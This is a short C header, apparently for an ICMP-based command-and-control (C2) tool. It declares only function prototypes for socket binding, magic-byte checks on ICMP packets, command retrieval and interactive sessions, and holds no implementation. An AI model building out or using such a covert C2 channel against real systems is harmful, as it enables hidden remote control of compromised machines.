#ifndef C2_H
#define C2_H

#include <netinet/ip_icmp.h>
#define BUFFER_SIZE 4096

void c2_init_n_call(char *interface_to_bind);
int create_socket(char *inteface_to_bind);
int read_from_socket(int sockfd, char *buffer,int size);
void interact(int sockfd);
void print_connection_succeed(int do_print, char *src_ip);
char *get_command(void);
int check_magic_byte(struct icmphdr *icmp);

#endif